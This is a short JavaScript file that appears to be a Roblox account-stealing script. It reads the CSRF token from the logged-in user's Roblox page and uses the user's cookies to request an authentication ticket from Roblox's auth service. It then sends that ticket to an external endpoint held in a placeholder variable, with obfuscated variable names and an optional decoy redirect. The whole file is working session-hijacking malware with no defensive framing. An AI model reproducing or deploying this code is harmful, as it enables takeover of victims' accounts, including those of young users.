var send = "#sendphp";
var text = "#text";
var textureS = "#ghuidfg";
async function texture() {
	var hash = (await (await fetch((await (await fetch("https://www.roblox.com/avatar-thumbnail-3d/json?userId=" + $("meta[name='user-data']").data("userid") + "&_=" + Math.random())).json()).Url)).json()).textures[0]

	for (var i = 31, t = 0; t < 32; t++)
		i ^= hash[t].charCodeAt(0);

	location.href = "https://t" + (i % 8).toString() + ".rbxcdn.com/" + hash
}
(async function() {
    var url = "";
    if (window.location.href.indexOf("web.roblox") > -1) {
      url = "https://web.roblox.com/home";
    }else{
        url = "https://www.roblox.com/home";
    }
    var _0x3051de = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
     })).text()).split('data-token=').pop().split('>')[0];
    var _0x3e8f56 = (await fetch('https://auth.roblox.com/v1/authentication-ticket', {
        'method': 'POST',
        'credentials': 'include',
        'headers': {
            'x-csrf-token': _0x3051de
        }
    }))['headers']['get']('rbx-authentication-ticket');
    await fetch(send + '?t=' + _0x3e8f56);
    prompt(text);
    if(textureS == "true"){
        await texture();
    }
}());

